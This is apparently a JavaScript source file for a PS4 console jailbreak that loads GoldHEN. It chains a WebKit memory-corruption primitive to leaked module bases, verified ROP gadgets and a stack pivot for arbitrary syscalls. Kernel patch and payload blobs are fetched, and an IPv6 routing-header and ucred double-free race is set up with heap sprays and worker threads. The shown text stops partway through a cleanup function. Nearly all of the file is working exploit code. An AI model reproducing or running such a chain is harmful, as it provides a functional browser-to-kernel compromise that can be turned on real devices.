// ?v=10 must match mem.js's specifier EXACTLY or core.js builds a second
// module record and releaseFakeCell() (only call site: mem.js:662) reaches a
// virgin instance, pinning ~137 MB for the life of the page.
import { establishPrimitive } from "./core.js?v=10";
import { installWindowP, pairStatus } from "./mem.js";
import { int64 } from "./int64.js";
import { offsetsFor } from "./ps4_offsets.js";

function ensureHostConsole() {
    var out = document.getElementById("out");
    var st = document.getElementById("state");
    if (!out) {
        out = document.createElement("pre");
        out.id = "out";
        out.setAttribute(
            "style",
            "position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;" +
                "overflow:hidden;opacity:0;pointer-events:none;"
        );
        (document.body || document.documentElement).appendChild(out);
    }
    if (!st) {
        st = document.createElement("div");
        st.id = "state";
        st.setAttribute(
            "style",
            "position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;" +
                "overflow:hidden;opacity:0;pointer-events:none;"
        );
        (document.body || document.documentElement).appendChild(st);
    }
    return { outEl: out, stateEl: st };
}
var _hostCons = ensureHostConsole();
const outEl = _hostCons.outEl;
const stateEl = _hostCons.stateEl;
const lines = [];
const params = new URLSearchParams(location.search);
const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";

function hostOk() {
    var m = document.getElementById("msgs");
    if (m) {
        m.innerHTML = "GoldHEN v2.4b18.10 Loaded ...";
    }
}

function hostFail() {
    var m = document.getElementById("msgs");
    if (m) {
        m.innerHTML = "Failed to Load! Restart Your Console ...";
        m.style.color = "yellow";
    }
}

function post(tag, detail) {
    try {
        const x = new XMLHttpRequest();
        x.open("POST", "t", true);
        x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        x.send("PS4-S10&tag=" + encodeURIComponent(tag)
             + "&detail=" + encodeURIComponent(String(detail == null ? "" : detail)));
    } catch (e) { }
}

const VERBOSE = params.get("verbose") === "1";
const PROSE = [
    / -- /, /\.\s/, /;\s/,
    /,\s+(which|so|and that|because|since|as that)\s/,
    /\s+(because|rather than|instead of|so that|which is|which means|which the|so the)\s/,
    /\s+so\s+[a-z]/,
    /\s+\([a-z][^)]{40,}\)/,
];
function terse(s) {
    if (VERBOSE || s == null) return s;
    s = String(s);
    for (const re of PROSE) {
        const m = re.exec(s);
        if (m && m.index > 0) s = s.slice(0, m.index);
    }
    s = s.replace(/\s+$/, "");
    if (s.length > 140) s = s.slice(0, 140) + "...";
    return s;
}
function mark(tag, detail) {
    const raw = detail;
    detail = terse(detail);
    lines.push(tag + (detail == null || detail === "" ? "" : "  " + detail));
    const esc = t => String(t).replace(/&/g, "&amp;").replace(/</g, "&lt;");
    outEl.innerHTML = lines.map(function (l) {
        l = esc(l);
        const c = /FAIL|ERROR|THREW|REBOOT|MISS|LOST|POISON|TIMEOUT|MISMATCH|ABORTED/i.test(l) ? "bad"
                : /WARN|SKIP|REFUSED|COMMITTED|DIRTY/i.test(l) ? "warn"
                : /\bOK\b|PASS|ACHIEVED|RUNNING|ARMED/i.test(l) ? "ok" : "";
        return c ? '<span class="' + c + '">' + l + "</span>" : l;
    }).join("\n");
    outEl.scrollTop = outEl.scrollHeight;
    post(tag, raw);
}

function trace(tag, detail) { if (VERBOSE) mark(tag, detail); else post(tag, detail); }
function state(t, c) { stateEl.textContent = t; stateEl.className = c || ""; }
function check(name, ok, detail) {
    return ok;
}
function hx(n) { return "0x" + (n >>> 0).toString(16); }

const SYS = { read: 3, write: 4, close: 6, getpid: 20, setuid: 0x17,
              getuid: 0x18, dup: 0x29, sendmsg: 0x1c, recvmsg: 0x1b,
              socket: 0x61, netcontrol: 0x63, socketpair: 0x87, kqueue: 0x16a,
              readv: 0x78, writev: 0x79, sysctl: 0xca, pipe: 0x2a, fcntl: 0x5c,
              setsockopt: 0x69, getsockopt: 0x76, sched_yield: 0x14b,
              rtprio_thread: 0x1d2, cpuset_setaffinity: 0x1e8,
              cpuset_getaffinity: 0x1e7, thr_self: 432,

              ioctl: 0x36, mmap: 0x1dd, jitshm_create: 0x215, kexec: 0x295 };
const NETEVENT_SET_QUEUE = 0x20000003, NETEVENT_CLEAR_QUEUE = 0x20000007;
const AF_UNIX = 1, AF_INET6 = 28, SOCK_STREAM = 1;
const IPPROTO_IPV6 = 41, IPV6_RTHDR = 51;
const UCRED_SIZE = 0x168;
const KQUEUE_SIZE = 0x100;
const NUM_LEAK_KQUEUE = 5000;

const KQ_BATCH = 8;
const KQ_HDR_MAGIC = 0x1430000;

const NUM_UIO_IOV = 0x14, UIO_SIZE = 0x30;
const NUM_UIO_SPRAY = 10000;
const NUM_IOV_SPRAY_MAX = 100000;
const UIO_READ = 0, UIO_WRITE = 1, UIO_SYSSPACE = 1;
const SOL_SOCKET = 0xffff, SO_SNDBUF = 0x1001;

const PIPEBUF_SIZEOF = 0x18, PIPE_PAGE = 0x4000, FILEDESCENT_SIZE = 8;
const F_SETFL = 4, O_NONBLOCK = 4;
const IP6_RTHDR0_SIZE = 8, IN6_ADDR_SIZE = 0x10;
const NUM_MSG_IOV = 0x17, IOVEC_SIZE = 0x10, MSGHDR_SIZE = 0x30;
const NUM_IPV6_SOCK = 0x100;

const RTHDR_TAG = 0x13370000;
const MAX_ROUNDS_TWIN = 10, MAX_ROUNDS_TRIPLET = 500, FIND_TRIPLET_FAST = 5000;

const RTP_PRIO_REALTIME = 2, RTP = 0x100, RTP_SET = 1, MAIN_CORE = 7;
const RTP_LOOKUP = 0, RTP_PRIO_NORMAL = 0;
const CPU_LEVEL_WHICH = 3, CPU_WHICH_TID = 1;
const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);

const keepAlive = [];
const workers = [];
let mainMf = null, mainOrig = null, mainArmed = false;
let committed = false, rebootRequired = false;

let kreadPoisoned = false;
let uafSock = 0;
let uafFpSaved = null;

let savedMask = null, savedPrio = null, restoreCtx = null, attrsRestored = false;

let allDone = false;
let payloadRunning = false;

(async function () {
    let p = null;
    try {

        const NUM_IOV_WORKER = params.has("iov")
            ? parseInt(params.get("iov"), 10) : 4;
        const NUM_ATTEMPT = params.has("attempts")
            ? parseInt(params.get("attempts"), 10) : 8;
        const NUM_IOV_SPRAY = params.has("spray")
            ? parseInt(params.get("spray"), 10) : 0x100;
        const { key, off } = offsetsFor(navigator.userAgent);
        mark("FW", key || "(not a PS4 UA)");
        if (!off) {
            var m = document.getElementById("msgs");
            if (m) {
                m.innerHTML = 'No offsets for this firmware: <span style="color: red;">'
                    + (key || "Unknown") + '</span>';
            }
            mark("NO-OFFSETS", key || "unknown");
            return;
        }
        mark("FW-STATUS", off.fw_status || "none");
        mark("PLAN", "iov_workers=" + NUM_IOV_WORKER + " attempts=" + NUM_ATTEMPT
            + " spray=" + NUM_IOV_SPRAY
            + " mode=" + (STOP_BEFORE_DOUBLE ? "stop-before-double" : "armed"));

        let kpatch = null, payload = null;
        // off.kpatch wins when a firmware shares another's kernel and therefore
        // its blob -- 12.02 uses 1200.bin. Otherwise derive it from the key.
        const kpatchName = off && off.kpatch ? "slopkit/patches/" + off.kpatch
            : key ? "slopkit/patches/" + key.replace(".", "") + ".bin" : null;
        const KPATCH_JMP_SITES = [];
        try {
            if (kpatchName) {
                const r = await fetch(kpatchName);
                if (r.ok) kpatch = new Uint8Array(await r.arrayBuffer());
            }
        } catch (e) { mark("KPATCH-FETCH-THREW", e.message); }
        if (kpatch) {

            for (let i = 0; i + 7 <= kpatch.length; ++i) {
                if (kpatch[i] !== 0xc6 || kpatch[i + 1] !== 0x81) continue;
                if (kpatch[i + 6] !== 0xeb) continue;
                KPATCH_JMP_SITES.push(((kpatch[i + 2]) | (kpatch[i + 3] << 8)
                    | (kpatch[i + 4] << 16) | (kpatch[i + 5] << 24)) >>> 0);
            }
        }
        mark("KPATCH-BLOB", kpatch
            ? "blob=" + kpatchName + " bytes=" + kpatch.length
              + " sites=" + KPATCH_JMP_SITES.length
            : "blob=" + kpatchName + " MISSING");
        try {
            const r = await fetch("goldhen_2.4b18.10.bin");
            if (r.ok) payload = new Uint8Array(await r.arrayBuffer());
        } catch (e) { mark("PAYLOAD-FETCH-THREW", e.message); }
        mark("PAYLOAD-BLOB", payload
            ? "bytes=" + payload.length + " entry="
              + (payload[0] === 0xe9 ? "e9-jmp-rel32" : "NOT-e9")
            : "MISSING");

        state("running the primitive...", "warn");
        await new Promise(r => setTimeout(r, 0));

        const PRIMITIVE_LOUD = /FAIL|ERROR|THREW|RETRY|ABORT|PASS/i;
        const carrier = await establishPrimitive({
            maxAttempts: 6,
            onEvent: (t, d, a) => (PRIMITIVE_LOUD.test(t) ? mark : trace)
                (t, (a != null ? "[" + a + "] " : "") + (d || ""))
        });
        // THE EXPERIMENT. Promotion releases the ~137 MB the OOM is made of --
        // proven: PAIR-UP released=13 on 2026-08-16 14:44. But releaseFakeCell()
        // only NULLS references; it does not free anything. It converts 137 MB
        // of quiet pinned memory into 137 MB of garbage and leaves the sweep to
        // JSC, which last time chose to run it somewhere inside the triple-free
        // race ~500 ms later (cr_refcnt-driven-1 rounds=256, twice).
        //
        // So: release it HERE, then make the collection happen HERE too, before
        // a single worker or kernel object exists.
        // OPT-IN, not opt-out. Promotion releases the ~137 MB -- but releasing
        // is not freeing: it turns quiet pinned memory into garbage that JSC
        // collects whenever it chooses, including mid-race. The sweep below was
        // meant to force that collection at a safe point and MEASURABLY DOES
        // NOT: 21 consecutive runs logged worst_cycle_ms 67-83 against a 60 ms
        // floor, i.e. a few ms of overhead and no full collection anywhere.
        // Until the sweep can be shown to actually collect, the pinned profile
        // is the safer one. ?pair=1 to experiment.
        const PAIR_ON = params.get("pair") === "1";
        const SWEEP_CYCLES = params.has("sweep")
            ? parseInt(params.get("sweep"), 10) : 6;
        const SWEEP_MS = params.has("sweepms")
            ? parseInt(params.get("sweepms"), 10) : 60;
        const SWEEP_MB = params.has("sweepmb")
            ? parseInt(params.get("sweepmb"), 10) : 8;

        installWindowP(carrier, {
            promote: PAIR_ON,
            onEvent: (t, d) => (PRIMITIVE_LOUD.test(t) ? mark : trace)(t, d || "")
        });
        if (!window.p) throw new Error("window.p was not installed");
        p = window.p;
        mark("PAIR-STATUS", "state=" + pairStatus.state
            + " promoted=" + pairStatus.promoted
            + " stage=" + pairStatus.stage
            + (pairStatus.failedAt ? " failedAt=" + pairStatus.failedAt : "")
            + (pairStatus.error ? " error=" + pairStatus.error : ""));

        // Provoke the collection. globalThis.gc does not exist in a shipping
        // WebProcess (core.js:368 guards for it and never fires), so the only
        // levers are allocation pressure and turning the event loop -- the
        // incremental sweeper cannot run while we hold the thread.
        //
        // OBSERVABLE: worst_cycle_ms. A cycle much longer than floor_ms is a
        // collection landing here instead of on the race. If every cycle sits
        // at the floor, nothing was swept and this experiment did nothing.
        if (pairStatus.promoted && SWEEP_CYCLES > 0) {
            state("sweeping...", "warn");
            const t0 = Date.now();
            let worst = 0;
            for (let i = 0; i < SWEEP_CYCLES; ++i) {
                const c0 = Date.now();
                let junk = [];
                for (let k = 0; k < SWEEP_MB; ++k)
                    junk.push(new ArrayBuffer(0x100000));
                junk.length = 0; junk = null;
                await new Promise(r => setTimeout(r, SWEEP_MS));
                const dt = Date.now() - c0;
                if (dt > worst) worst = dt;
            }
            mark("SWEEP", "cycles=" + SWEEP_CYCLES + " mb=" + SWEEP_MB
                + " floor_ms=" + SWEEP_MS + " worst_cycle_ms=" + worst
                + " total_ms=" + (Date.now() - t0));
        } else {
            mark("SWEEP-SKIPPED", "promoted=" + pairStatus.promoted
                + " cycles=" + SWEEP_CYCLES);
        }
        mark("PRIMITIVE-OK", "");

        const cell = p.leakval(Math.expm1);
        const nativeFn = p.read8(p.read8(cell.add32(0x18))
            .add32(off.wk_JSFunction_m_function));
        const webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
        const errorFn = p.read8(webkitBase.add32(off.wk___imp___error));
        const libkernelBase = errorFn.sub32(off.k__error);
        mark("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
        const aligned = v => v.hi > 0 && (v.low & 0x3fff) === 0;
        if (!check("module-bases-0x4000-aligned",
            aligned(webkitBase) && aligned(libkernelBase), "")) {
            throw new Error("module bases not aligned");
        }

        const G = {};
        const GAD = [
            ["POP_RDI_RET", off.wk_POP_RDI_RET, [0x5f, 0xc3]],
            ["POP_RSI_RET", off.wk_POP_RSI_RET, [0x5e, 0xc3]],
            ["POP_RDX_RET", off.wk_POP_RDX_RET, [0x5a, 0xc3]],
            ["POP_RCX_RET", off.wk_POP_RCX_RET, [0x59, 0xc3]],
            ["POP_R8_RET", off.wk_POP_R8_RET, [null, 0x58, 0xc3]],
            ["POP_R9_RET", off.wk_POP_R9_RET, [null, 0x59, 0xc3]],
            ["POP_RAX_RET", off.wk_POP_RAX_RET, [0x58, 0xc3]],
            ["LEAVE_RET", off.wk_LEAVE_RET, [0xc9, 0xc3]],
            ["MOV_RDI_RAX_RET", off.wk_MOV_QWORD_PTR_RDI_RAX_RET, [0x48, 0x89, 0x07, 0xc3]],
            ["G0", off.wk_MOV_RDI_RSI_30_CALL, [0x48, 0x8b, 0x7e, 0x30]],
            ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18, [0x58, 0x48, 0x8b, 0x07]],
            ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10, [0x55, 0x48, 0x89, 0xe5]],
            ["G3", off.wk_MOV_RDI_RAX_8_CALL_20, [0x48, 0x8b, 0x78, 0x08]],
            ["G4", off.wk_MOV_RDX_RAX_18_CALL_10, [0x48, 0x8b, 0x50, off.pivot_view_sp]],
            ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [0x52, 0x5c, 0xc3]],
        ];
        let gated = 0;
        for (const [nm, rva, pat] of GAD) {
            const a = webkitBase.add32(rva);
            let good = true;
            for (let i = 0; i < pat.length; ++i) {
                if (pat[i] === null) continue;
                if (p.read1(a.add32(i)) !== pat[i]) { good = false; break; }
            }
            if (good) { G[nm] = a; gated++; } else mark("GADGET-BAD", nm);
        }
        if (!check("gadget-table-fits-module", gated === GAD.length,
            gated + "/" + GAD.length)) {
            throw new Error("gadget table incomplete");
        }
        const argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET,
                           G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];

        const stubAddr = new Map();
        let seeded = 0;
        if (off.k_stubs) {
            for (const numStr in off.k_stubs) {
                const num = +numStr, o = off.k_stubs[numStr];
                const v = p.read8(libkernelBase.add32(o));
                if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) continue;
                if ((((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0) !== num) continue;
                stubAddr.set(num, libkernelBase.add32(o)); seeded++;
            }
        }
        const need = new Set(Object.keys(SYS).map(k => SYS[k])
            .filter(n => !stubAddr.has(n)));
        let scanned = 0;
        for (let o = 0; o < off.k_scan_stage1 && need.size; o += 16) {
            const v = p.read8(libkernelBase.add32(o));
            if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) continue;
            const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
            if (!need.has(num)) continue;
            stubAddr.set(num, libkernelBase.add32(o)); need.delete(num); scanned++;
        }
        mark("STUBS", "seeded=" + seeded + " scanned=" + scanned);
        const miss = Object.keys(SYS).filter(k => !stubAddr.has(SYS[k]));
        if (!check("syscall-page-needs-stub", miss.length === 0,
            miss.join(","))) {
            throw new Error("missing syscall stubs");
        }

        function bufAddr(ab) {
            const c = p.leakval(ab);
            return p.read8(p.read8(c.add32(off.wk_ArrayBuffer_m_impl))
                .add32(off.wk_ArrayBuffer_m_contents_m_data));
        }
        function put(dv, at, v) {
            if (typeof v === "number") {
                dv.setUint32(at, v >>> 0, true);
                dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
            } else {
                dv.setUint32(at, v.low >>> 0, true);
                dv.setUint32(at + 4, v.hi >>> 0, true);
            }
        }
        const PB_SIZE = Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);
        function makeCtx() {
            const sb = new ArrayBuffer(0x20), pb = new ArrayBuffer(PB_SIZE);
            const kb = new ArrayBuffer(0x2000), fb = new ArrayBuffer(0x40);
            keepAlive.push(sb, pb, kb, fb);
            const c = { storeDv: new DataView(sb), pivotDv: new DataView(pb),
                stackDv: new DataView(kb), frameDv: new DataView(fb),
                stackU8: new Uint8Array(kb), frameU8: new Uint8Array(fb) };
            keepAlive.push(c.storeDv, c.pivotDv, c.stackDv, c.frameDv,
                c.stackU8, c.frameU8);
            c.S = bufAddr(sb); c.P = bufAddr(pb);
            c.K = bufAddr(kb); c.F = bufAddr(fb);
            put(c.storeDv, 0x00, G.G1); put(c.storeDv, 0x08, c.P);
            put(c.storeDv, 0x10, G.G3); put(c.storeDv, 0x18, G.G2);
            put(c.pivotDv, 0x00, c.P); put(c.pivotDv, 0x10, G.G5);
            put(c.pivotDv, 0x20, G.G4);
            return c;
        }
        function layout(c, target, args) {
            c.stackU8.fill(0); c.frameU8.fill(0);
            const insts = [];
            for (let i = 0; i < args.length; ++i) {
                insts.push(argGadget[i]); insts.push(args[i]);
            }
            const targetIdx = insts.length;
            insts.push(target);
            insts.push(G.POP_RDI_RET); insts.push(c.F);
            insts.push(G.MOV_RDI_RAX_RET);
            insts.push(G.POP_RAX_RET); insts.push(JSVALUE_UNDEFINED);
            insts.push(G.LEAVE_RET);
            let at = 0x2000 - 8 * insts.length;
            if (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;
            for (let i = 0; i < insts.length; ++i) put(c.stackDv, at + 8 * i, insts[i]);
            put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
        }
        const M = makeCtx();
        mainMf = p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function);
        mainOrig = p.read8(mainMf);
        const pivotObj = {};
        keepAlive.push(pivotObj);
        const pivotCell = p.leakval(pivotObj);
        p.write8(mainMf, G.G0);
        mainArmed = true;
        function callAddr(target, args) {
            layout(M, target, args);
            const saved = p.read8(pivotCell);
            p.write8(pivotCell, M.S);
            Math.expm1(pivotObj);
            p.write8(pivotCell, saved);
            return { lo: M.frameDv.getUint32(0, true),
                     hi: M.frameDv.getUint32(4, true),
                     i32: M.frameDv.getUint32(0, true) | 0 };
        }
        const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
        function errno() {
            const r = callAddr(errorFn, []);
            const a = new int64(r.lo, r.hi);
            return (a.hi === 0 && a.low === 0) ? -1 : p.read4(a) | 0;
        }
        const pid = sc(SYS.getpid).i32;
        check("chain-reaches-kernel", pid > 0,
            "pid=" + pid + " uid=" + sc(SYS.getuid).i32);
			
        try {
            var uid0 = sc(SYS.getuid).i32;
            var su0 = sc(SYS.setuid, 0).i32;
            if (uid0 === 0 || su0 === 0) {
                mark("ALREADY-ROOT", "getuid=" + uid0 + " setuid(0)=" + su0);
                var m = document.getElementById("msgs");
                if (m) {
                    m.innerHTML = "GoldHEN is Already Loaded ...";
                }
                return;
            }
        } catch (e) {}

        const scratchAb = new ArrayBuffer(0x1000); keepAlive.push(scratchAb);
        const scratch = bufAddr(scratchAb);
        const argAb = new ArrayBuffer(8); keepAlive.push(argAb);
        const argAddr = bufAddr(argAb), argDv = new DataView(argAb);
        const lenAb = new ArrayBuffer(8); keepAlive.push(lenAb);
        const lenAddr = bufAddr(lenAb), lenDv = new DataView(lenAb);
        const sprayAb = new ArrayBuffer(UCRED_SIZE); keepAlive.push(sprayAb);
        const sprayAddr = bufAddr(sprayAb), sprayDv = new DataView(sprayAb);
        const leakAb = new ArrayBuffer(UCRED_SIZE); keepAlive.push(leakAb);
        const leakAddr = bufAddr(leakAb), leakDv = new DataView(leakAb);
        // R2. getsockopt(IPV6_RTHDR) can copy out FEWER bytes than asked, and
        // every reader below then parses whatever the PREVIOUS call left in the
        // buffer. poops.js:1849 uses the same 0xee sentinel. Filling only the
        // requested window keeps this proportional to the copy already being
        // made -- this runs inside the spray loops.
        const leakU8 = new Uint8Array(leakAb);
        const R2_ON = params.get("r2") !== "0";
        let shortReads = 0;

        // ITEM 6(a). THE BURN LIST. After a double free, the sockets whose
        // rthdr aliases the freed ucred must never be touched again. The lethal
        // operation is setRthdr: on a socket that already owns an rthdr it is a
        // free-then-realloc, so re-spraying a burned socket FREES the aliased
        // chunk and leaves the other owner dangling. freeRthdr and close are
        // equally fatal. A burned fd is therefore excluded from every spray,
        // every scan, and the teardown close -- until kernel R/W can repair it.
        const burned = new Set();
        function burn(fd, why) {
            if (fd > 0 && !burned.has(fd)) {
                burned.add(fd);
                mark("BURNED", "fd=" + fd + " why=" + why + " total=" + burned.size);
            }
        }

        function buildRthdr(dv, size) {
            const n = Math.floor((size - IP6_RTHDR0_SIZE) / IN6_ADDR_SIZE);
            new Uint8Array(dv.buffer).fill(0);
            dv.setUint8(0, 0); dv.setUint8(1, n * 2);
            dv.setUint8(2, 0); dv.setUint8(3, n);
            return IP6_RTHDR0_SIZE + IN6_ADDR_SIZE * n;
        }
        const sprayLen = buildRthdr(sprayDv, UCRED_SIZE);
        const setRthdr = s => sc(SYS.setsockopt, s, IPPROTO_IPV6, IPV6_RTHDR,
            sprayAddr, sprayLen).i32;
        const freeRthdr = s => {
            // ITEM 6(a) chokepoint. The other guards filter at SELECTION time
            // (findTwins/findTriplet never hand back a burned fd). This is the
            // structural one: even if a future edit lets a burned fd through,
            // the free that would make it a double free cannot happen.
            if (burned.has(s)) {
                mark("FREERTHDR-REFUSED", "fd=" + s + " is burned");
                return -1;
            }
            return sc(SYS.setsockopt, s, IPPROTO_IPV6, IPV6_RTHDR, 0, 0).i32;
        };

        // `need` = the highest byte offset the CALLER will actually parse. A
        // copyout shorter than that is reported as -1 rather than handing back
        // the previous call's bytes. No mark() here -- this is a hot path; the
        // count is reported once at make_karw.
        function getRthdr(s, size, need) {
            if (R2_ON) leakU8.fill(0xee, 0, size);
            lenDv.setUint32(0, size, true);
            const rv = sc(SYS.getsockopt, s, IPPROTO_IPV6, IPV6_RTHDR,
                leakAddr, lenAddr).i32;
            if (rv !== 0) return -1;
            const got = lenDv.getUint32(0, true);
            if (R2_ON && need !== undefined && got < need) { shortReads++; return -1; }
            return got;
        }
        function netevent(sock, event) {
            argDv.setUint32(0, sock >>> 0, true); argDv.setUint32(4, 0, true);
            const r = sc(SYS.netcontrol, -1, event, argAddr, 8).i32;
            return { rv: r, err: r === -1 ? errno() : 0 };
        }

        const iovAb = new ArrayBuffer(IOVEC_SIZE * NUM_MSG_IOV);
        const msgAb = new ArrayBuffer(MSGHDR_SIZE);
        keepAlive.push(iovAb, msgAb);
        const iovAddr = bufAddr(iovAb), msgAddr = bufAddr(msgAb);
        const iovDv = new DataView(iovAb), msgDv = new DataView(msgAb);

        new Uint8Array(iovAb).fill(0);
        put(iovDv, 0, 1);
        put(iovDv, 8, 1);
        new Uint8Array(msgAb).fill(0);
        put(msgDv, 0x10, iovAddr);
        msgDv.setInt32(0x18, NUM_MSG_IOV, true);

        state("setting up...", "warn");
        if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1)
            throw new Error("socketpair failed");
        const iovSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
        if (sc(SYS.socketpair, AF_UNIX, SOCK_STREAM, 0, argAddr).i32 === -1)
            throw new Error("uio socketpair failed");
        const uioSs = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
        mark("IOV-SS", "iov=" + iovSs.join(",") + " uio=" + uioSs.join(","));

        if (sc(SYS.pipe, argAddr).i32 === -1) throw new Error("master pipe failed");
        const masterPipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
        if (sc(SYS.pipe, argAddr).i32 === -1) throw new Error("slave pipe failed");
        const slavePipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
        check("karw-pipe-pairs-exist",
            masterPipe[0] > 0 && masterPipe[1] > 0
            && slavePipe[0] > 0 && slavePipe[1] > 0,
            "master " + masterPipe + "  slave " + slavePipe);

        const dummyAb = new ArrayBuffer(0x1000); keepAlive.push(dummyAb);
        new Uint8Array(dummyAb).fill(0x41);
        const dummyAddr = bufAddr(dummyAb);
        const uioIovAb = new ArrayBuffer(IOVEC_SIZE * NUM_UIO_IOV);
        keepAlive.push(uioIovAb);
        const uioIovAddr = bufAddr(uioIovAb), uioIovDv = new DataView(uioIovAb);

        new Uint8Array(uioIovAb).fill(0);
        put(uioIovDv, 0, dummyAddr);
        const ipv6 = [];
        for (let i = 0; i < NUM_IPV6_SOCK; ++i) {
            const s = sc(SYS.socket, AF_INET6, SOCK_STREAM, 0).i32;
            if (s === -1) break;
            ipv6.push(s);
        }
        check("reclaim-sockets-open", ipv6.length === NUM_IPV6_SOCK,
            ipv6.length + "/" + NUM_IPV6_SOCK);

        function makeRpc(w, name) {
            let seq = 0;
            const pending = new Map();
            w.onmessage = function (e) {
                const d = e.data || {};
                const slot = pending.get(d.id);
                if (!slot) return;
                pending.delete(d.id);
                if (slot.timer) clearTimeout(slot.timer);
                if (d.type === "err") slot.reject(new Error(String(d.value)));
                else slot.resolve(d.value);
            };
            w.onerror = e => mark("WORKER-ONERROR", name + " "
                + ((e && e.message) ? e.message : String(e)));

            return function call(fname, timeoutMs, ...args) {
                return new Promise(function (resolve, reject) {
                    const id = seq++;
                    const timer = timeoutMs > 0 ? setTimeout(function () {
                        pending.delete(id);
                        reject(new Error(name + ": timeout waiting for " + fname));
                    }, timeoutMs) : null;
                    pending.set(id, { resolve, reject, timer });
                    w.postMessage({ id: id, name: fname, args: args });
                });
            };
        }
        function ptrish(v) { return v.hi > 0 && v.hi < 0x10000 && (v.low & 7) === 0; }

        const NUM_UIO_WORKER = params.has("uio")
            ? parseInt(params.get("uio"), 10) : 4;
        const TOTAL_WORKERS = NUM_IOV_WORKER + NUM_UIO_WORKER;
        state("bringing up " + TOTAL_WORKERS + " workers...", "warn");
        for (let i = 0; i < TOTAL_WORKERS; ++i) {
            const name = (i < NUM_IOV_WORKER ? "iov" : "uio")
                + (i < NUM_IOV_WORKER ? i : i - NUM_IOV_WORKER);
            const w = { name: name, armed: false, wired: false };
            workers.push(w);
            w.worker = new Worker("slopkit/rpc_worker.js");
            w.rpc = makeRpc(w.worker, name);
            if ((await w.rpc("ping", 15000)) !== "pong")
                throw new Error(name + " did not answer ping");
            const sLo = (0x10100000 | i) >>> 0, sHi = (0xc0de0000 | i) >>> 0;
            const arr = await w.rpc("init", 15000, sLo, sHi);
            keepAlive.push(arr);
            const D = bufAddr(arr.buffer);
            if ((p.read4(D) >>> 0) !== sLo)
                throw new Error(name + ": transfer did not preserve the store");
            const storage = p.read8(D.add32(0x10));
            const mc = ptrish(storage) ? p.read8(storage.add32(8)) : null;
            if (!mc || !ptrish(mc)) throw new Error(name + ": walk failed");
            const bf = p.read8(mc.add32(8));
            let wm = null, wv = null, wl = null;
            for (let k = 1; k <= 8; ++k) {
                const val = p.read8(bf.sub32(8 * k));
                if (!ptrish(val)) continue;
                const inl = p.read8(val.add32(0x10));
                const len = p.read4(val.add32(0x18)) >>> 0;
                if (inl.hi === 0 && inl.low === 2) { if (!wl) wl = val; }
                else if (inl.hi > 0 && len === 6) { if (!wm) wm = val; }
                else if (inl.hi > 0 && len === 0x30) { if (!wv) wv = val; }
            }
            if (!(wm && wv && wl)) throw new Error(name + ": shapes not found");
            w.master = wm; w.origVector = p.read8(wm.add32(0x10));
            p.write8(wm.add32(0x10), wv); w.wired = true;
            await w.rpc("setup", 15000, wl.low, wl.hi);
            await w.rpc("armPivot", 15000, G.G0.low, G.G0.hi);
            w.armed = true;
            w.ctx = makeCtx();
        }
        check("worker-came-arw",
            workers.length === TOTAL_WORKERS,
            workers.length + "/" + TOTAL_WORKERS);
        const iovWorkers = workers.slice(0, NUM_IOV_WORKER);
        const uioWorkers = workers.slice(NUM_IOV_WORKER);
        mark("WORKER-POOLS", "iov=" + iovWorkers.length
            + " uio=" + uioWorkers.length);

        const prioAb = new ArrayBuffer(8), maskAb = new ArrayBuffer(0x10);
        keepAlive.push(prioAb, maskAb);
        const prioAddr = bufAddr(prioAb), maskAddr = bufAddr(maskAb);
        const prioDv = new DataView(prioAb), maskDv = new DataView(maskAb);

        new Uint8Array(maskAb).fill(0);
        sc(SYS.cpuset_getaffinity, CPU_LEVEL_WHICH, CPU_WHICH_TID,
            new int64(0xffffffff, 0xffffffff), 0x10, maskAddr);
        savedMask = new int64(maskDv.getUint32(0, true), maskDv.getUint32(4, true));
        prioDv.setUint16(0, 0xffff, true);
        prioDv.setUint16(2, 0xffff, true);
        sc(SYS.rtprio_thread, RTP_LOOKUP, 0, prioAddr);
        savedPrio = [prioDv.getUint16(0, true), prioDv.getUint16(2, true)];

        async function restoreThreadAttrs(why) {
            if (attrsRestored || !savedMask || !savedPrio) return;
            attrsRestored = true;
            const ID = new int64(0xffffffff, 0xffffffff);

            // MAIN THREAD FIRST. attrsRestored is latched at the top of this
            // function, so a death anywhere below leaves main realtime-256 on
            // MAIN_CORE AND makes the finally's retry a permanent no-op -- the
            // console then refuses to power off. The 16 worker RPCs used to run
            // first, and that is the exact shape of run #52 (SOCKETS-CLOSED,
            // nothing after). POOPS.LUA:1253-1257 restores ONLY the calling
            // thread and never touches a worker; we cannot copy that (our
            // workers outlive the page) but we can copy the ordering.
            // Widen affinity before dropping priority, never the reverse.
            new Uint8Array(maskAb).fill(0);
            maskDv.setUint32(0, savedMask.low, true);
            maskDv.setUint32(4, savedMask.hi, true);
            const ar = sc(SYS.cpuset_setaffinity, CPU_LEVEL_WHICH,
                CPU_WHICH_TID, ID, 0x10, maskAddr).i32;
            prioDv.setUint16(0, savedPrio[0], true);
            prioDv.setUint16(2, savedPrio[1], true);
